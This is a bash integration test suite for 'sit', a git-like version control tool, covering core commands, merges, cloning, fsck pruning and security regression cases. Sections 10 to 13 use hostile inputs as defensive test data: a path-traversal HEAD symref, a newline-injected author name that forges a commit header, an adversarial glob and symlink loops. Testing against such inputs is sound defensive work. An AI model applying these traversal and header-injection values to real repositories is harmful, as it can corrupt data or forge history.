#!/usr/bin/env bash
# sit — in-tree integration suite (v0.8.12)
#
# Promotes the docs/guides/getting-started.md end-to-end scenarios into a
# versioned, locally-runnable test with explicit assertions, plus the two
# v0.8.12 feature gates (shallow clone, `log --graph`). Runnable locally
# (`tests/integration/run.sh`) and from CI. Exits non-zero on any failure.
#
# Binary: $SIT, else <repo>/build/sit. Each scenario runs in an isolated
# HOME + temp repo; everything is cleaned up on exit.
set -u

ROOT=$(cd "$(dirname "$0")/../.." && pwd)
SIT="${SIT:-$ROOT/build/sit}"
[ -x "$SIT" ] || { echo "sit binary not found at $SIT — build with 'cyrius build src/main.cyr build/sit'"; exit 1; }

WORK=$(mktemp -d -t sit-itest.XXXXXX)

# Build the .git/ read-mode library probe (against the shipped dist/sit.cyr
# bundle) BEFORE HOME is isolated below — cyrius needs the real HOME to find
# its toolchain. Empty if the toolchain isn't on this runner (binary-only CI).
# A toolchain that is present but cannot compile the bundle is a FAILURE, not a
# skip — that is exactly the consumer breakage this probe exists to catch.
GIT_PROBE=""
GIT_PROBE_BROKEN=0
if command -v cyrius >/dev/null 2>&1; then
  if ( cd "$ROOT" && cyrius build tests/integration/git_probe.cyr "$WORK/git_probe" ) >"$WORK/git_probe.log" 2>&1; then
    GIT_PROBE="$WORK/git_probe"
  else
    GIT_PROBE_BROKEN=1
  fi
fi
# 1.7.5: the per-read heap probe, against the shipped READ bundle (what owl and
# thoth link). Same rule: present but not compiling is a failure.
READ_PROBE=""
READ_PROBE_BROKEN=0
if command -v cyrius >/dev/null 2>&1; then
  if ( cd "$ROOT" && cyrius build tests/integration/read_heap_probe.cyr "$WORK/read_heap_probe" ) >"$WORK/read_heap_probe.log" 2>&1; then
    READ_PROBE="$WORK/read_heap_probe"
  else
    READ_PROBE_BROKEN=1
  fi
fi
# 1.7.5: the per-ref-push probe, against the shipped full bundle (dist/sit.cyr).
PUSH_PROBE=""
PUSH_PROBE_BROKEN=0
if command -v cyrius >/dev/null 2>&1; then
  if ( cd "$ROOT" && cyrius build tests/integration/serve_push_probe.cyr "$WORK/serve_push_probe" ) >"$WORK/serve_push_probe.log" 2>&1; then
    PUSH_PROBE="$WORK/serve_push_probe"
  else
    PUSH_PROBE_BROKEN=1
  fi
fi

# 1.7.6: the public-API probe (sit_repo_status / sit_diff_path), against the
# shipped READ bundle. Same rule.
API_PROBE=""
API_PROBE_BROKEN=0
if command -v cyrius >/dev/null 2>&1; then
  if ( cd "$ROOT" && cyrius build tests/integration/api_heap_probe.cyr "$WORK/api_heap_probe" ) >"$WORK/api_heap_probe.log" 2>&1; then
    API_PROBE="$WORK/api_heap_probe"
  else
    API_PROBE_BROKEN=1
  fi
fi

export HOME="$WORK/home"; mkdir -p "$HOME"
export SIT_AUTHOR_NAME="Integration Test"
export SIT_AUTHOR_EMAIL="itest@sit.local"
trap 'rm -rf "$WORK"' EXIT

PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); }
bad()  { FAIL=$((FAIL+1)); printf '  FAIL: %s\n' "$*"; }
assert_eq()       { if [ "$1" = "$2" ]; then ok; else bad "$3 (expected '$2', got '$1')"; fi; }
assert_contains() { case "$1" in *"$2"*) ok;; *) bad "$3 (missing '$2')";; esac; }
hr() { printf '\n=== %s ===\n' "$*"; }

# Object count from `fsck` ("checked N objects, ...").
objcount() { "$SIT" fsck 2>/dev/null | sed -n 's/^checked \([0-9]*\) objects.*/\1/p'; }

# ── 1. core loop: init → add → commit → log → status → fsck ─────────
hr "core loop"
R="$WORK/core"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'hello\n' > a.txt
"$SIT" add a.txt >/dev/null
"$SIT" commit -m "first" >/dev/null
assert_contains "$("$SIT" log --oneline)" "first" "log shows first commit"
assert_eq "$(objcount)" "3" "one commit = 3 objects"
assert_contains "$("$SIT" fsck)" "0 bad" "fsck clean after first commit"

# diff of a working-tree change
printf 'hello\nworld\n' > a.txt
assert_contains "$("$SIT" diff)" "+world" "diff shows the added line"

# ── 1b. no upward repo discovery (ADR 0003) ────────────────────────
# sit never walks parent dirs to find a .sit/ (CVE-2022-24765 shape). From a
# subdirectory of a repo, commands that need a repo must refuse, not climb.
# Run in the main shell (no subshell) so the assert counters accumulate; the
# next section cd's to its own absolute dir, so leaving cwd here is fine.
mkdir -p sub/deep && cd sub/deep
"$SIT" status >/dev/null 2>&1; assert_eq "$?" "1" "status refuses from a subdir (no upward discovery)"
"$SIT" log    >/dev/null 2>&1; assert_eq "$?" "1" "log refuses from a subdir"
DISC_OUT=$("$SIT" commit -m x 2>&1); assert_eq "$?" "1" "commit refuses from a subdir"
assert_contains "$DISC_OUT" "not a sit repository" "subdir error names 'not a sit repository'"

# ── 2. branch + merge → merge commit ───────────────────────────────
hr "branch + merge"
R="$WORK/merge"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'a\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m "base1" >/dev/null
printf 'b\n' > b.txt; "$SIT" add b.txt >/dev/null; "$SIT" commit -m "base2" >/dev/null
"$SIT" checkout -b feature >/dev/null
printf 'c\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m "feature work" >/dev/null
"$SIT" checkout main >/dev/null
printf 'd\n' > d.txt; "$SIT" add d.txt >/dev/null; "$SIT" commit -m "main work" >/dev/null
"$SIT" merge feature >/dev/null 2>&1
assert_contains "$("$SIT" fsck)" "0 bad" "fsck clean after merge"

# ── 3. log --graph structure (hash-independent) ────────────────────
hr "log --graph"
GRAPH=$("$SIT" log --graph | sed 's/[0-9a-f]\{12\}/HASH/')
EXPECTED=$(cat <<'EOF'
* HASH Merge branch 'feature'
|\
* | HASH main work
| * HASH feature work
|/
* HASH base2
* HASH base1
EOF
)
assert_eq "$GRAPH" "$EXPECTED" "graph DAG shape matches the merge snapshot"

# ── 3a. log --graph lane-0 join (v0.9.0 regression — seam underflow) ─
# When the merge's second parent (feature) is STRICTLY newer than the first
# (main), the feature lane emits first and main's lane (column 0) collapses —
# the join seam would underflow to buf-1. Guarded in v0.9.0. The 2s sleep
# forces feature's commit into a later whole-second so it sorts newest.
hr "log --graph lane-0 join (seam-underflow regression)"
R="$WORK/graph0"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'base\n' > base.txt; "$SIT" add base.txt >/dev/null; "$SIT" commit -m "base" >/dev/null
"$SIT" branch feature >/dev/null 2>&1
printf 'a\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m "main-work" >/dev/null
sleep 2
"$SIT" checkout feature >/dev/null 2>&1
printf 'b\n' > b.txt; "$SIT" add b.txt >/dev/null; "$SIT" commit -m "feature-work" >/dev/null
"$SIT" checkout main >/dev/null 2>&1
"$SIT" merge feature >/dev/null 2>&1
G0=$("$SIT" log --graph 2>&1); RC=$?
assert_eq "$RC" "0" "log --graph exits 0 on a lane-0 join (no OOB write)"
assert_contains "$G0" "feature-work" "lane-0-join graph still lists the feature commit"
assert_contains "$G0" "main-work" "lane-0-join graph still lists the main commit"

# ── 3b. merge-base full-DAG LCA (v0.8.13 diamond gate) ─────────────
# Build a diamond where the first-parent chain reaches the true base only
# through a merge's second parent. Layout:
#   R ─ A ─ M ─ C   (main; M merges feature)
#    \     /
#     B ─────── D   (feature)
# True LCA(C, D) = B. The pre-v0.8.13 first-parent walk fell back to R.
hr "merge-base full-DAG LCA (diamond)"
R="$WORK/diamond"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'r\n' > r.txt; "$SIT" add r.txt >/dev/null; "$SIT" commit -m "R" >/dev/null
ROOT_COMMIT=$(tr -d '\n' < .sit/refs/heads/main)
"$SIT" checkout -b feature >/dev/null
printf 'b\n' > b.txt; "$SIT" add b.txt >/dev/null; "$SIT" commit -m "B" >/dev/null
BASE=$(tr -d '\n' < .sit/refs/heads/feature)
"$SIT" checkout main >/dev/null
printf 'a\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m "A" >/dev/null
"$SIT" merge feature >/dev/null 2>&1
printf 'c\n' > c.txt; "$SIT" add c.txt >/dev/null; "$SIT" commit -m "C" >/dev/null
"$SIT" checkout feature >/dev/null
printf 'd\n' > d.txt; "$SIT" add d.txt >/dev/null; "$SIT" commit -m "D" >/dev/null
MB=$("$SIT" merge-base main feature)
assert_eq "$MB" "$BASE" "merge-base(main,feature) = B (true full-DAG LCA)"
if [ "$MB" = "$ROOT_COMMIT" ]; then bad "merge-base returned root (pre-v0.8.13 first-parent behavior)"; else ok; fi
# self and ancestor identities
assert_eq "$("$SIT" merge-base main main)" "$(tr -d '\n' < .sit/refs/heads/main)" "merge-base(X,X) = X"

# ── 3c. fsck --prune + reflog grace (v0.8.14 prune; v1.1.0 reflog grace) ──
# Two commits, then reset --hard to the first. v1.1.0: the reflog records the
# discarded tip, so B's objects are reflog-REACHABLE (not dangling) and --prune
# protects them. Clearing the log un-protects them; --prune then keeps recent
# objects within the 90-day grace window, and --prune-now sweeps immediately.
hr "fsck --prune"
R="$WORK/prune"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'v1\n' > f.txt; "$SIT" add f.txt >/dev/null; "$SIT" commit -m "A" >/dev/null
APRUNE=$(tr -d '\n' < .sit/refs/heads/main)
printf 'v2\n' > f.txt; "$SIT" add f.txt >/dev/null; "$SIT" commit -m "B" >/dev/null
BPRUNE=$(tr -d '\n' < .sit/refs/heads/main)
assert_eq "$(objcount)" "6" "two commits = 6 objects"
"$SIT" reset --hard "$APRUNE" >/dev/null 2>&1
# reflog protects the discarded tip → not dangling
assert_eq "$("$SIT" fsck | sed -n 's/.*0 bad, \([0-9]*\) dangling/\1/p')" "0" "reset --hard: B's objects reflog-protected (0 dangling)"
assert_contains "$("$SIT" fsck --prune)" "pruned 0 objects" "--prune keeps reflog-reachable objects"
assert_eq "$(objcount)" "6" "all 6 objects survive --prune while reflog intact"
# recovery: HEAD@{1} resolves to the discarded tip
"$SIT" reset --hard "HEAD@{1}" >/dev/null 2>&1
assert_eq "$(tr -d '\n' < .sit/refs/heads/main)" "$BPRUNE" "reset --hard HEAD@{1} recovers B"
"$SIT" reset --hard "$APRUNE" >/dev/null 2>&1
# clear the reflog → B's objects are now genuinely dangling
rm -rf .sit/logs
assert_eq "$("$SIT" fsck | sed -n 's/.*0 bad, \([0-9]*\) dangling/\1/p')" "3" "after clearing reflog, 3 dangling (B's commit/tree/blob)"
# 90-day grace keeps the recent objects; --prune-now sweeps them
assert_contains "$("$SIT" fsck --prune)" "kept 3 within grace" "--prune keeps recent dangling within grace window"
assert_eq "$(objcount)" "6" "grace window leaves all 6 in place"
assert_contains "$("$SIT" fsck --prune-now)" "pruned 3 objects" "--prune-now reports 3 removed"
# fresh process: durability + reachable history intact
assert_eq "$(objcount)" "3" "after prune-now, only A's 3 objects remain"
assert_contains "$("$SIT" fsck)" "0 dangling" "post-prune fsck is dangling-free"
assert_eq "$(cat f.txt)" "v1" "working tree still has A's content"
assert_eq "$("$SIT" log --oneline | wc -l | tr -d ' ')" "1" "log shows only the kept commit"
# refuse --prune during an in-progress merge
printf '%s\n' "$APRUNE" > .sit/MERGE_HEAD
"$SIT" fsck --prune >/dev/null 2>&1; assert_eq "$?" "1" "--prune refused while MERGE_HEAD present"
rm -f .sit/MERGE_HEAD

# ── 4. clone (file://) full round-trip ─────────────────────────────
hr "clone file:// full"
R="$WORK/origin"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
for i in 1 2 3 4 5 6 7 8 9 10; do
  printf 'line %s\n' "$i" >> f.txt
  "$SIT" add f.txt >/dev/null
  "$SIT" commit -m "commit $i" >/dev/null
done
ORIGIN_OBJS=$(objcount)
assert_eq "$ORIGIN_OBJS" "30" "10-commit origin = 30 objects"
cd "$WORK"
"$SIT" clone --force-absolute "$R" full >/dev/null 2>&1
cd "$WORK/full"
assert_eq "$(objcount)" "30" "full clone copies all 30 objects"
assert_eq "$("$SIT" log --oneline | wc -l | tr -d ' ')" "10" "full clone log shows 10 commits"
assert_contains "$("$SIT" fsck)" "0 bad" "full clone fsck clean"

# ── 5. shallow clone --depth 1 (v0.8.12 gate) ──────────────────────
hr "shallow clone --depth 1"
cd "$WORK"
"$SIT" clone --depth 1 --force-absolute "$R" d1 >/dev/null 2>&1
cd "$WORK/d1"
assert_eq "$(objcount)" "3" "--depth 1 pulls exactly 3 objects (1 commit+tree+blob)"
assert_eq "$("$SIT" log --oneline | wc -l | tr -d ' ')" "1" "--depth 1 log shows 1 commit"
"$SIT" log --oneline >/dev/null 2>&1; assert_eq "$?" "0" "--depth 1 log exits 0 (clean shallow boundary)"
assert_contains "$("$SIT" fsck)" "0 bad" "--depth 1 fsck clean despite absent parent"
[ -f .sit/shallow ]; assert_eq "$?" "0" ".sit/shallow boundary marker written"
assert_eq "$(wc -l < .sit/shallow | tr -d ' ')" "1" ".sit/shallow lists one boundary commit"

# ── 6. shallow clone --depth 3 ─────────────────────────────────────
hr "shallow clone --depth 3"
cd "$WORK"
"$SIT" clone --depth 3 --force-absolute "$R" d3 >/dev/null 2>&1
cd "$WORK/d3"
assert_eq "$(objcount)" "9" "--depth 3 pulls 9 objects (3 commits)"
assert_eq "$("$SIT" log --oneline | wc -l | tr -d ' ')" "3" "--depth 3 log shows 3 commits"

# ── 7. push round-trip over file:// ────────────────────────────────
hr "push round-trip"
cd "$WORK/full"
printf 'extra\n' >> f.txt
"$SIT" add f.txt >/dev/null
"$SIT" commit -m "downstream commit" >/dev/null
# push back to a fresh bare-ish origin clone to avoid denyCurrentBranch.
cd "$WORK"
"$SIT" clone --force-absolute "$R" pushtarget >/dev/null 2>&1
cd "$WORK/full"
"$SIT" remote add target "$WORK/pushtarget" >/dev/null 2>&1
# (push to the remote's checked-out branch is refused by design; this just
#  exercises that the dispatch + FF preflight run without crashing.)
"$SIT" push target main >/dev/null 2>&1 || true
ok   # reaching here without a crash is the assertion

# ── 8. large-file diff via Myers fallback (P-14) ───────────────────
# A >8192-line file exceeds the LCS DP cap, so the diff must route through
# the Myers fallback and produce a real diff, not the "too large" refusal.
hr "large-file diff (Myers fallback)"
R="$WORK/bigdiff"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
seq 1 9000 > big.txt
"$SIT" add big.txt >/dev/null
"$SIT" commit -m "9000 lines" >/dev/null
sed -i '5000s/.*/CHANGED-LINE/' big.txt   # change one line in the middle
DOUT=$("$SIT" diff 2>&1)
assert_contains "$DOUT" "+CHANGED-LINE" "9000-line diff shows the changed line (Myers engaged)"
assert_contains "$DOUT" "-5000" "9000-line diff shows the removed original line"
case "$DOUT" in
  *"too large"*) bad "large-file diff was refused — Myers fallback not engaged" ;;
  *) ok ;;
esac

# ── 9. .git/ read-mode (roadmap 1.2.0) ─────────────────────────────
# sit reads an EXISTING git repository (SHA-1 loose objects + refs) read-only,
# through the same read verbs. Guarded on `git` so a git-less runner skips
# rather than fails. Covers loose blob read, HEAD→commit resolution, and the
# packed-refs path (pack-refs prunes the loose branch ref, forcing the
# .git/packed-refs lookup).
hr ".git/ read-mode (loose objects + refs)"
if command -v git >/dev/null 2>&1; then
  R="$WORK/gitread"; mkdir -p "$R"; cd "$R"
  git init -q
  git config user.email itest@sit.local >/dev/null 2>&1
  git config user.name "Integration Test" >/dev/null 2>&1
  printf 'hello from git\nsecond line\n' > f.txt
  git add f.txt
  git commit -qm "git commit" >/dev/null 2>&1
  BLOB=$(git rev-parse HEAD:f.txt)
  HEADC=$(git rev-parse HEAD)
  assert_eq "$("$SIT" cat-file "$BLOB")" "$(git cat-file blob "$BLOB")" "sit reads a git loose blob by oid"
  assert_eq "$("$SIT" cat-file HEAD)" "$(git cat-file commit "$HEADC")" "sit resolves git HEAD symref + reads the commit"
  git pack-refs --all >/dev/null 2>&1
  assert_eq "$("$SIT" cat-file HEAD)" "$(git cat-file commit "$HEADC")" "sit resolves HEAD via .git/packed-refs after pack-refs"
  # Pack the objects too (loose removed) — exercises the .idx v2 lookup + pack
  # v2 header parse + zlib inflate path.
  git repack -ad >/dev/null 2>&1
  assert_eq "$("$SIT" cat-file "$BLOB")" "$(git cat-file blob "$BLOB")" "sit reads a packed blob (.idx lookup + inflate)"
  assert_eq "$("$SIT" cat-file HEAD)" "$(git cat-file commit "$HEADC")" "sit reads a packed commit via HEAD"

  # SHA-256 git repos (extensions.objectFormat=sha256): 64-hex ids / 32-byte
  # raw hashes — exercises the _id_hexlen=64 / _id_rawlen=32 backend path,
  # loose and packed. Skipped if the local git predates sha256 support.
  R="$WORK/gitsha256"; mkdir -p "$R"; cd "$R"
  if git init -q --object-format=sha256 2>/dev/null; then
    git config user.email itest@sit.local >/dev/null 2>&1
    git config user.name "Integration Test" >/dev/null 2>&1
    printf 'sha256 content\nsecond line\n' > s.txt
    git add s.txt && git commit -qm "sha256" >/dev/null 2>&1
    S256=$(git rev-parse HEAD:s.txt)
    assert_eq "${#S256}" "64" "sha256 repo yields 64-hex oids"
    assert_eq "$("$SIT" cat-file "$S256")" "$(git cat-file blob "$S256")" "sit reads a SHA-256 loose blob"
    git repack -ad >/dev/null 2>&1
    assert_eq "$("$SIT" cat-file "$S256")" "$(git cat-file blob "$S256")" "sit reads a SHA-256 packed blob (.idx rawlen=32)"
  else
    printf '  SKIP: git lacks --object-format=sha256\n'
  fi

  # Library surface (consumer bundle): run the probe built above against
  # dist/sit.cyr — the same include owl/thoth use — and assert sit_repo_branch
  # / sit_repo_status match the working tree.
  if [ -n "$GIT_PROBE" ]; then
    R="$WORK/gitapi"; mkdir -p "$R"; cd "$R"
    git init -q
    git config user.email itest@sit.local >/dev/null 2>&1
    git config user.name "Integration Test" >/dev/null 2>&1
    printf 'orig\n' > tracked.txt; printf 'bye\n' > gone.txt
    git add -A && git commit -qm base >/dev/null 2>&1
    printf 'orig\nCHANGED\n' > tracked.txt   # modified
    rm gone.txt                               # deleted
    printf 'fresh\n' > fresh.txt              # new (untracked)
    APIOUT=$("$GIT_PROBE" 2>/dev/null)
    assert_contains "$APIOUT" "BRANCH "               "probe: sit_repo_branch returns a branch"
    assert_contains "$APIOUT" "STATUS M tracked.txt"  "probe: sit_repo_status reports modified"
    assert_contains "$APIOUT" "STATUS D gone.txt"     "probe: sit_repo_status reports deleted"
    assert_contains "$APIOUT" "STATUS N fresh.txt"    "probe: sit_repo_status reports new"
  elif [ "$GIT_PROBE_BROKEN" = 1 ]; then
    bad "probe: dist/sit.cyr does not compile into a consumer"
    grep -E 'error|reachable call site' "$WORK/git_probe.log" | sed 's/^/    /'
  else
    printf '  SKIP: library-API probe unavailable (cyrius toolchain not found)\n'
  fi
else
  printf '  SKIP: git not installed — .git/ read-mode test skipped\n'
fi

# ── 10. hostile packfile corpus (S-24, 2026-08-17 audit) ───────────
# `.git/` read-mode parses attacker-controlled .idx / .pack bytes whenever a
# consumer points sit at a repo cloned from a hostile remote. Four of these
# cases were live defects at v1.3.6: three SIGSEGVs in the .idx table math and
# a 127-byte heap disclosure via the delta literal opcode. Guarded on python3
# (needed to build binary fixtures) so a python-less runner skips.
hr "hostile packfile corpus (.idx / delta bounds)"
if command -v python3 >/dev/null 2>&1; then
  if python3 "$ROOT/tests/integration/hostile_pack.py" "$SIT" "$WORK/hostile" >"$WORK/hostile.log" 2>&1; then
    # 11 hostile cases + 1 positive control, all asserted inside the script.
    N=$(grep -c '^  PASS' "$WORK/hostile.log")
    i=0; while [ "$i" -lt "$N" ]; do ok; i=$((i+1)); done
  else
    bad "hostile packfile corpus (see below)"
    sed 's/^/    /' "$WORK/hostile.log"
  fi
else
  printf '  SKIP: python3 not installed — hostile packfile corpus skipped\n'
fi

# ── 11. S-25 regressions (2026-08-18 deep audit) ───────────────────
# Each of these reproduced a live defect at v1.3.7. They are ordinary
# operations, not exotic inputs — the merge case in particular needs no
# hostile data at all.
hr "S-25 regressions (deep-audit fixes)"

# 11a. CRITICAL: three_way_line_merge looped forever on an insert-only hunk
# (base_start == base_end), running `out` past its allocation. One side
# appends a line, the other prepends one — an everyday merge. Was SIGSEGV.
R="$WORK/s25merge"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'a\nb\n' > f.txt; "$SIT" add f.txt >/dev/null; "$SIT" commit -m base >/dev/null
"$SIT" branch other >/dev/null 2>&1
printf 'a\nb\nAPPEND\n' > f.txt; "$SIT" add f.txt >/dev/null; "$SIT" commit -m ours >/dev/null
"$SIT" checkout other >/dev/null 2>&1
printf 'PREPEND\na\nb\n' > f.txt; "$SIT" add f.txt >/dev/null; "$SIT" commit -m theirs >/dev/null
"$SIT" checkout main >/dev/null 2>&1
timeout 30 "$SIT" merge other >/dev/null 2>&1; MRC=$?
assert_eq "$MRC" "0" "insert-only-hunk merge completes (no SIGSEGV/hang)"
assert_eq "$(cat f.txt)" "$(printf 'PREPEND\na\nb\nAPPEND')" "insert-only-hunk merge keeps BOTH sides' edits"

# 11b. HIGH: _wildmatch catastrophic backtracking — an 18-byte ignore file
# pinned a core forever. Same matcher serves .gitignore on the owl/thoth
# read path.
R="$WORK/s25glob"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf '*a*a*a*a*a*a*a*a*b\n' > .sitignore
: > aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
timeout 20 "$SIT" status >/dev/null 2>&1
assert_eq "$?" "0" "adversarial glob pattern does not hang sit status"

# 11c. HIGH: a HEAD symref target was never validated, so `.sit/HEAD`
# containing `ref: ../../X` made commit write 64 hex bytes OUTSIDE the repo.
R="$WORK/s25head"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'x\n' > f.txt; "$SIT" add f.txt >/dev/null; "$SIT" commit -m one >/dev/null 2>&1
rm -f "$WORK/ESCAPED"
printf 'ref: ../../ESCAPED\n' > .sit/HEAD
printf 'y\n' > g.txt; "$SIT" add g.txt >/dev/null 2>&1
"$SIT" commit -m two >/dev/null 2>&1
if [ -f "$WORK/ESCAPED" ]; then bad "HEAD symref traversal wrote outside the repo"; else ok; fi

# 11d. HIGH: `is_dir` follows symlinks, so a self-referential symlinked dir
# recursed to the kernel's 40-deep ELOOP cap emitting nonsense paths. git
# treats a symlink as a leaf; so do we now.
R="$WORK/s25link"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
mkdir sub && ln -s .. sub/loop
LOOPOUT=$(timeout 20 "$SIT" status 2>&1); assert_eq "$?" "0" "symlink loop does not hang the worktree walk"
case "$LOOPOUT" in
  *loop/sub/loop*) bad "worktree walk descended through a symlink" ;;
  *) ok ;;
esac

# 11e. HIGH: config_file_set sized its output for ONE occurrence of the key
# but rewrote EVERY matching line — 2000 duplicates + a 1000-byte value wrote
# ~2 MB into a ~9 KB allocation.
R="$WORK/s25cfg"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
{ echo '[user]'; i=0; while [ $i -lt 500 ]; do echo 'dup.key=1'; i=$((i+1)); done; } > .sit/config
BIGVAL=$(printf 'v%.0s' $(seq 1 900))
timeout 20 "$SIT" config dup.key "$BIGVAL" >/dev/null 2>&1
assert_eq "$?" "0" "config set with many duplicate keys succeeds"
assert_eq "$("$SIT" config dup.key)" "$BIGVAL" "config value round-trips after duplicate-key rewrite"

# ── 12. S-26 regressions (deferred-findings sweep) ─────────────────
hr "S-26 regressions (deferred-findings sweep)"

# 12a. MEDIUM: lcs_diff's per-dimension 8192 guard fired before the cell-count
# test, so adding or deleting a file of >8192 lines was pushed to the Myers
# fallback, whose edit-distance cap cannot represent it — sit printed a header
# and ZERO content lines. The table is 1 x (n+1) here: ~64 KB, trivially fine.
R="$WORK/s26diff"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'seed\n' > seed.txt; "$SIT" add seed.txt >/dev/null; "$SIT" commit -m seed >/dev/null
awk 'BEGIN{for(i=1;i<=8193;i++) print "line " i}' > big.txt
"$SIT" add big.txt >/dev/null; "$SIT" commit -m big >/dev/null
assert_eq "$("$SIT" show | grep -c '^+line')" "8193" "8193-line file addition diffs in full (was 0 lines)"

# 12b. LOW: -U0 emitted a spurious leading context line on every hunk after the
# first, because the hunk-close path pushed into `pending` without the ctx trim.
R="$WORK/s26u0"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
awk 'BEGIN{for(i=1;i<=40;i++) print "L" i}' > f.txt
"$SIT" add f.txt >/dev/null; "$SIT" commit -m base >/dev/null
awk 'BEGIN{for(i=1;i<=40;i++){ if(i==6) print "CHANGED6"; else if(i==31) print "CHANGED31"; else print "L" i}}' > f.txt
"$SIT" add f.txt >/dev/null; "$SIT" commit -m edit >/dev/null
assert_eq "$("$SIT" show -U0 | grep '^@@' | tr '\n' ' ')" "@@ -6 +6 @@ @@ -31 +31 @@ " \
  "-U0 emits zero context (matches GNU diff -U0)"

# 12c. LOW: `-U<N>` was unbounded, so ctx >= 2^62 overflowed `2 * ctx` negative
# and the trim loop spun ~4.6e18 times.
timeout 20 "$SIT" show -U4611686018427387904 >/dev/null 2>&1
assert_eq "$?" "0" "huge -U<N> does not hang (2*ctx overflow)"

# 12d. MEDIUM: parse_tree silently drops entries with a non-allowlisted mode,
# so their objects were invisible to fsck's reachability walk, reported
# dangling, and DELETED by --prune-now while a live tree still referenced them.
# fsck must now refuse to prune when a reachable tree has unparseable entries.
R="$WORK/s26fsck"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'content\n' > x.txt; "$SIT" add x.txt >/dev/null; "$SIT" commit -m one >/dev/null
assert_contains "$("$SIT" fsck)" "0 bad" "baseline fsck clean before prune check"
assert_eq "$("$SIT" fsck --prune-now >/dev/null 2>&1; echo $?)" "0" "fsck --prune-now succeeds on a well-formed repo"

# ── 13. S-27 regressions (1.4.0 integrity) ─────────────────────────
hr "S-27 regressions (fsck missing + ident sanitization)"

# 13a. A newline in SIT_AUTHOR_NAME forged a `parent` header line in the commit
# object — verified pre-fix — and fsck then called the repo clean. Identity
# components are now stripped of control bytes and `<`/`>` before framing.
R="$WORK/s27ident"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
FORGED="1111111111111111111111111111111111111111111111111111111111111111"
printf 'x\n' > f.txt; "$SIT" add f.txt >/dev/null
SIT_AUTHOR_NAME="$(printf 'evil\nparent %s' "$FORGED")" "$SIT" commit -m one >/dev/null 2>&1
IDH=$(tr -d '\n' < .sit/refs/heads/main)
assert_eq "$("$SIT" cat-file "$IDH" | grep -c "^parent $FORGED")" "0" \
  "newline in author name cannot forge a parent header"
assert_contains "$("$SIT" fsck)" "0 bad" "repo written with a hostile ident is still structurally clean"

# 13b. fsck must REPORT a referent that is absent from the store. Previously an
# object not in the store was never enumerated and the walk silently skipped it,
# so this exact shape reported `0 bad, 0 dangling` and exited 0.
R="$WORK/s27missing"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'y\n' > g.txt; "$SIT" add g.txt >/dev/null; "$SIT" commit -m base >/dev/null
# Hand-write a HEAD pointing at a commit id that was never stored.
printf '%s\n' "$FORGED" > .sit/refs/heads/main
MISSOUT=$("$SIT" fsck 2>&1); MISSRC=$?
assert_contains "$MISSOUT" "missing $FORGED" "fsck reports an absent referent as missing"
assert_eq "$MISSRC" "1" "fsck exits non-zero when an object is missing"

# 13c. A shallow clone's boundary parents are absent BY DESIGN and must NOT be
# reported — this is the distinction that makes 13b safe. Covered by the
# `--depth 1` scenario above; asserted here as an explicit pairing.
R="$WORK/s27shallow"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf '1\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c1 >/dev/null
printf '2\n' > a.txt; "$SIT" add a.txt >/dev/null; "$SIT" commit -m c2 >/dev/null
cd "$WORK"; "$SIT" clone --depth 1 "file://$WORK/s27shallow" s27sc >/dev/null 2>&1
cd "$WORK/s27sc" 2>/dev/null && {
  assert_contains "$("$SIT" fsck)" "0 bad" "shallow boundary parents are not reported missing"
}

# ── 14. S-28 regressions (1.4.6 index write amplification) ─────────
hr "S-28 regressions (single-row index upsert)"

# 14a. `sit add` used to rewrite the ENTIRE entries table per staged file
# (DELETE-all + re-INSERT every row), so staging N files wrote O(N^2) rows.
# patra never returns emptied pages to a freelist, so that volume was
# permanent on disk: a 1,000-file repo reached a 277 MB .sit/index.patra
# holding 1,000 live entries, and `sit status` full-scans that file. The
# upsert is now a targeted DELETE + one INSERT. Assert the file stays small.
R="$WORK/s28bloat"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
i=0
while [ $i -lt 60 ]; do
  printf 'file %s\n' "$i" > "f$i.txt"
  "$SIT" add "f$i.txt" >/dev/null
  i=$((i+1))
done
IDXKB=$(du -k .sit/index.patra | cut -f1)
# Pre-fix this was ~1 MB at N=60 and grew quadratically; 256 KB is a
# generous ceiling that still fails loudly if the rewrite-all comes back.
assert_eq "$([ "$IDXKB" -lt 256 ] && echo ok || echo "too big: ${IDXKB}KB")" "ok" \
  "staging 60 files leaves a compact .sit/index.patra"

# 14b. Re-staging the same path must REPLACE its row, not append a second one.
# The targeted DELETE is what enforces this now; previously the in-memory
# filter did.
R="$WORK/s28replace"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null
printf 'one\n' > a.txt; "$SIT" add a.txt >/dev/null
printf 'two\n' > a.txt; "$SIT" add a.txt >/dev/null
printf 'three\n' > a.txt; "$SIT" add a.txt >/dev/null
assert_eq "$("$SIT" status | grep -c 'a.txt')" "1" \
  "re-staging a path three times leaves exactly one index entry"
"$SIT" commit -m c1 >/dev/null
assert_contains "$("$SIT" status)" "nothing to commit" \
  "index matches the tree after re-staged commit"

